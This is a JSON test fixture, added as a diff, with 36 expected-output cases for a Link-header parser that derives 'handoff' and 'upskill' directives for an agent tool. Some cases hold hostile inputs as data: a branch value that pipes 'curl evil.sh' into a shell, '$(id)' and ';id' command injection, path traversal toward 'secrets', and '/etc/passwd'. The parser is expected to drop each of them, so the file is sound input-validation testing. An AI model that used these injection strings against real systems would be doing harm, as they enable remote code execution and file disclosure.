@@ -1,0 +1,692 @@
+{
+  "caseCount": 36,
+  "handoffRel": "https://www.sliccy.ai/rel/handoff",
+  "upskillRel": "https://www.sliccy.ai/rel/upskill",
+  "cases": [
+    {
+      "name": "empty header",
+      "header": "",
+      "links": [],
+      "handoff": null
+    },
+    {
+      "name": "single link, unquoted rel token",
+      "header": "<https://example.com/a>; rel=next",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "two links separated by comma",
+      "header": "<https://example.com/a>; rel=\"next\", <https://example.com/b>; rel=\"prev\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        },
+        {
+          "href": "https://example.com/b",
+          "rel": [
+            "prev"
+          ],
+          "params": {
+            "rel": "prev"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "space-separated rel list",
+      "header": "<https://example.com/a>; rel=\"next prefetch\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next",
+            "prefetch"
+          ],
+          "params": {
+            "rel": "next prefetch"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "unterminated angle bracket stops parsing",
+      "header": "<https://example.com/a; rel=\"next\"",
+      "links": [],
+      "handoff": null
+    },
+    {
+      "name": "garbage before a valid link is skipped",
+      "header": "not-a-link, <https://example.com/a>; rel=\"next\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "quoted value containing a comma and semicolon",
+      "header": "<https://example.com/a>; rel=\"next\"; title=\"a, b; c\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next",
+            "title": "a, b; c"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "backslash escape inside a quoted value",
+      "header": "<https://example.com/a>; rel=\"next\"; title=\"say \\\"hi\\\"\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next",
+            "title": "say \"hi\""
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "param names are lowercased",
+      "header": "<https://example.com/a>; REL=\"next\"; TITLE=\"T\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next",
+            "title": "T"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "repeated rel keeps the first per RFC 8288",
+      "header": "<https://example.com/a>; rel=\"first\"; rel=\"second\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "first"
+          ],
+          "params": {
+            "rel": "first"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "CDP joins multi-value headers with newline",
+      "header": "<https://example.com/a>; rel=\"next\"\n<https://example.com/b>; rel=\"prev\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        },
+        {
+          "href": "https://example.com/b",
+          "rel": [
+            "prev"
+          ],
+          "params": {
+            "rel": "prev"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "array input is joined",
+      "header": [
+        "<https://example.com/a>; rel=\"next\"",
+        "<https://example.com/b>; rel=\"prev\""
+      ],
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        },
+        {
+          "href": "https://example.com/b",
+          "rel": [
+            "prev"
+          ],
+          "params": {
+            "rel": "prev"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "relative reference resolves against the base URL",
+      "header": "</skills/x>; rel=\"next\"",
+      "baseUrl": "https://example.com/page",
+      "links": [
+        {
+          "href": "https://example.com/skills/x",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "RFC 8187 ext value overrides the plain parameter",
+      "header": "<https://example.com/a>; rel=\"next\"; title=\"plain\"; title*=UTF-8''caf%C3%A9",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next",
+            "title": "café"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "non-UTF-8 ext value is ignored, plain value survives",
+      "header": "<https://example.com/a>; rel=\"next\"; title=\"plain\"; title*=ISO-8859-1''caf%E9",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next",
+            "title": "plain"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "handoff with empty anchor resolves to the page itself",
+      "header": "<>; rel=\"https://www.sliccy.ai/rel/handoff\"; title=\"fix the build\"",
+      "baseUrl": "https://example.com/page",
+      "links": [
+        {
+          "href": "https://example.com/page",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff",
+            "title": "fix the build"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/page",
+        "instruction": "fix the build"
+      }
+    },
+    {
+      "name": "handoff without a title carries no instruction",
+      "header": "<https://example.com/x>; rel=\"https://www.sliccy.ai/rel/handoff\"",
+      "links": [
+        {
+          "href": "https://example.com/x",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/x"
+      }
+    },
+    {
+      "name": "handoff ignores branch and path",
+      "header": "<https://example.com/x>; rel=\"https://www.sliccy.ai/rel/handoff\"; branch=\"main\"; path=\"skills/a\"",
+      "links": [
+        {
+          "href": "https://example.com/x",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff",
+            "branch": "main",
+            "path": "skills/a"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/x"
+      }
+    },
+    {
+      "name": "empty title is not an instruction",
+      "header": "<https://example.com/x>; rel=\"https://www.sliccy.ai/rel/handoff\"; title=\"\"",
+      "links": [
+        {
+          "href": "https://example.com/x",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff",
+            "title": ""
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/x"
+      }
+    },
+    {
+      "name": "upskill with branch and path",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"main\"; path=\"skills/demo\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "main",
+            "path": "skills/demo"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r",
+        "branch": "main",
+        "path": "skills/demo"
+      }
+    },
+    {
+      "name": "upskill path drops a trailing SKILL.md",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; path=\"skills/demo/SKILL.md\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "path": "skills/demo/SKILL.md"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r",
+        "path": "skills/demo"
+      }
+    },
+    {
+      "name": "upskill path of exactly SKILL.md canonicalises to nothing",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; path=\"SKILL.md\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "path": "SKILL.md"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "first recognised rel wins when both verbs are present",
+      "header": "<https://example.com/p>; rel=\"https://www.sliccy.ai/rel/handoff\", <https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"",
+      "links": [
+        {
+          "href": "https://example.com/p",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff"
+          }
+        },
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/p"
+      }
+    },
+    {
+      "name": "unrelated rels produce no handoff",
+      "header": "<https://example.com/a>; rel=\"next\"",
+      "links": [
+        {
+          "href": "https://example.com/a",
+          "rel": [
+            "next"
+          ],
+          "params": {
+            "rel": "next"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "rel comparison is case-sensitive",
+      "header": "<https://example.com/x>; rel=\"https://www.sliccy.ai/rel/HANDOFF\"",
+      "links": [
+        {
+          "href": "https://example.com/x",
+          "rel": [
+            "https://www.sliccy.ai/rel/HANDOFF"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/HANDOFF"
+          }
+        }
+      ],
+      "handoff": null
+    },
+    {
+      "name": "branch carrying a command separator is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"main;curl evil.sh|sh\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "main;curl evil.sh|sh"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "branch carrying command substitution is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"$(id)\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "$(id)"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "branch with a traversal segment is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"a/../b\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "a/../b"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "branch starting with a dash is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"-flag\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "-flag"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "branch with a .lock suffix is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"main.lock\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "main.lock"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "non-ASCII branch is dropped (homoglyph spoofing)",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch=\"mаin\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "mаin"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "absolute path is dropped (wire format is repo-relative)",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; path=\"/etc/passwd\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "path": "/etc/passwd"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "path traversal is dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; path=\"../../secrets\"",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "path": "../../secrets"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    },
+    {
+      "name": "newline in an instruction survives as content, not structure",
+      "header": "<https://example.com/p>; rel=\"https://www.sliccy.ai/rel/handoff\"; title=\"line1\\nline2\"",
+      "links": [
+        {
+          "href": "https://example.com/p",
+          "rel": [
+            "https://www.sliccy.ai/rel/handoff"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/handoff",
+            "title": "line1nline2"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "handoff",
+        "target": "https://example.com/p",
+        "instruction": "line1nline2"
+      }
+    },
+    {
+      "name": "ext-encoded branch is decoded then allowlisted",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch*=UTF-8''feature%2Fnew",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "feature/new"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r",
+        "branch": "feature/new"
+      }
+    },
+    {
+      "name": "ext-encoded branch that decodes to an unsafe value is still dropped",
+      "header": "<https://github.com/o/r>; rel=\"https://www.sliccy.ai/rel/upskill\"; branch*=UTF-8''main%3Bid",
+      "links": [
+        {
+          "href": "https://github.com/o/r",
+          "rel": [
+            "https://www.sliccy.ai/rel/upskill"
+          ],
+          "params": {
+            "rel": "https://www.sliccy.ai/rel/upskill",
+            "branch": "main;id"
+          }
+        }
+      ],
+      "handoff": {
+        "verb": "upskill",
+        "target": "https://github.com/o/r"
+      }
+    }
+  ]
+}
